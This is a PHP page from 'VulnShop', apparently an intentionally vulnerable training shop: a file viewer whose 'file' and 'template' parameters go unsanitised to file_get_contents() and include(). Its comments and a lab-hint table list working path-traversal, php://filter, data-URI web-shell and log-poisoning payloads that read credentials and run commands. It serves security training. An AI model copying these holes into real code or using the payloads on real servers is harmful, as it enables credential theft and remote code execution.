<?php
// ============================================================
//  VulnShop - File Viewer / Download
//  VULNERABILITIES:
//  - Local File Inclusion (LFI): 'file' param passed raw to include()
//  - Path Traversal: no sanitisation on file path
//  - Information Disclosure: reads arbitrary server files
//  - Remote File Inclusion (RFI): allow_url_include may permit it
//  - Log Poisoning setup: view access.log then inject PHP via User-Agent
// ============================================================
$page_title = 'File Viewer';
require_once 'includes/header.php';

$output   = '';
$error    = '';
$file_req = '';

// List of "safe" files shown as examples (but the param is not restricted)
$demo_files = [
    'includes/db.php'       => 'Database Config (credentials!)',
    'includes/header.php'   => 'Header Template',
    'includes/footer.php'   => 'Footer Template',
    '.htaccess'             => 'Apache Config',
    'database.sql'          => 'SQL Schema',
];

if (isset($_GET['file']) && $_GET['file'] !== '') {
    // VULNERABILITY: no path restriction — directory traversal
    $file_req = $_GET['file'];

    // VULNERABILITY: raw file path used in file_get_contents
    // Payloads:
    //   ?file=../../../../../../../etc/passwd
    //   ?file=../../../../../../../windows/win.ini
    //   ?file=../../../../../../../xampp/apache/logs/access.log  (log poisoning)
    //   ?file=php://filter/convert.base64-encode/resource=includes/db.php
    //   ?file=php://input  (POST body as PHP)
    //   ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
    $full_path = $file_req;

    if (@file_exists($full_path) || strpos($full_path, 'php://') === 0 || strpos($full_path, 'data://') === 0) {
        $output = @file_get_contents($full_path);
        if ($output === false) {
            $error = "Could not read file: <code>$full_path</code>";
        }
    } else {
        // Try relative to doc root
        $output = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/' . $full_path);
        if ($output === false) {
            $error = "File not found: <code>$full_path</code>";
        }
    }
}

// PHP include() LFI — second vector
$tpl = isset($_GET['template']) ? $_GET['template'] : '';
if ($tpl !== '') {
    // VULNERABILITY: direct include of user-supplied path
    // ?template=../../../../../../../etc/passwd%00   (null byte on old PHP)
    // ?template=php://input  with POST: <?php system('id'); ?>
    ob_start();
    @include($tpl);
    $include_out = ob_get_clean();
}
?>

<div class="page-title">
    <h1><i class="fas fa-folder-open"></i> File Viewer</h1>
    <span class="vuln-tag">LFI / Path Traversal</span>
</div>

<div class="lab-hint">
    <h4><i class="fas fa-flask"></i> Vulnerability: Local File Inclusion (LFI) + Path Traversal</h4>
    <table>
        <tr><th>Vector</th><th>Payload</th></tr>
        <tr><td>Linux passwd</td><td><code>?file=../../../../../../../etc/passwd</code></td></tr>
        <tr><td>Windows hosts</td><td><code>?file=../../../../../../../windows/system32/drivers/etc/hosts</code></td></tr>
        <tr><td>DB credentials</td><td><code>?file=includes/db.php</code></td></tr>
        <tr><td>PHP filter (base64)</td><td><code>?file=php://filter/convert.base64-encode/resource=includes/db.php</code></td></tr>
        <tr><td>Data URI RCE</td><td><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=</code></td></tr>
        <tr><td>PHP include() LFI</td><td><code>?template=../../../../../../../etc/passwd</code></td></tr>
        <tr><td>Log poisoning step 1</td><td>Send: <code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code></td></tr>
        <tr><td>Log poisoning step 2</td><td><code>?file=../../../../../../../xampp/apache/logs/access.log&cmd=whoami</code></td></tr>
    </table>
</div>

<div class="two-col-layout">
    <!-- File Read Vector -->
    <div>
        <div class="checkout-section">
            <h3><i class="fas fa-file-alt"></i> file_get_contents() Vector</h3>
            <form method="GET">
                <div class="form-group">
                    <label>File Path <small style="color:#e74c3c">(no sanitisation — path traversal!)</small></label>
                    <input type="text" name="file" class="form-control"
                           value="<?php echo htmlspecialchars($file_req); ?>"
                           placeholder="../../../etc/passwd">
                </div>
                <button class="btn btn-primary">Read File</button>
            </form>

            <h4 style="margin-top:16px">Quick Links:</h4>
            <div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:8px">
                <?php foreach ($demo_files as $path => $label): ?>
                    <a href="?file=<?php echo urlencode($path); ?>" class="btn btn-sm btn-outline"><?php echo $label; ?></a>
                <?php endforeach; ?>
                <a href="?file=../../../../../../../etc/passwd" class="btn btn-sm btn-danger">/etc/passwd</a>
                <a href="?file=php://filter/convert.base64-encode/resource=includes/db.php" class="btn btn-sm btn-danger">PHP filter</a>
            </div>
        </div>

        <!-- include() Vector -->
        <div class="checkout-section" style="margin-top:16px">
            <h3><i class="fas fa-code"></i> include() Vector</h3>
            <form method="GET">
                <div class="form-group">
                    <label>Template Path <small style="color:#e74c3c">(directly passed to include())</small></label>
                    <input type="text" name="template" class="form-control"
                           value="<?php echo htmlspecialchars($tpl); ?>"
                           placeholder="includes/footer.php">
                </div>
                <button class="btn btn-primary">Include File</button>
            </form>
            <?php if (!empty($include_out)): ?>
                <div style="margin-top:12px;background:#f8fafc;padding:10px;border-radius:6px;border:1px solid #e2e8f0">
                    <strong>Included output:</strong>
                    <pre style="white-space:pre-wrap;font-size:0.8rem;margin-top:6px"><?php echo htmlspecialchars($include_out); ?></pre>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Output Panel -->
    <div>
        <?php if ($error): ?>
            <div class="alert alert-danger"><?php echo $error; ?></div>
        <?php endif; ?>

        <?php if ($output !== ''): ?>
        <div class="checkout-section">
            <h3>
                File Output: <code style="font-size:0.8rem"><?php echo htmlspecialchars($file_req); ?></code>
                <small style="float:right"><?php echo strlen($output); ?> bytes</small>
            </h3>
            <pre class="file-output"><?php echo htmlspecialchars($output); ?></pre>
            <div style="margin-top:10px">
                <?php
                // If base64 output, offer decode
                $decoded = base64_decode($output, true);
                if ($decoded !== false && strlen($decoded) > 0):
                ?>
                <details>
                    <summary class="btn btn-sm btn-secondary">Base64 Decoded</summary>
                    <pre class="file-output" style="margin-top:8px"><?php echo htmlspecialchars($decoded); ?></pre>
                </details>
                <?php endif; ?>
            </div>
        </div>
        <?php endif; ?>
    </div>
</div>

<?php require_once 'includes/footer.php'; ?>
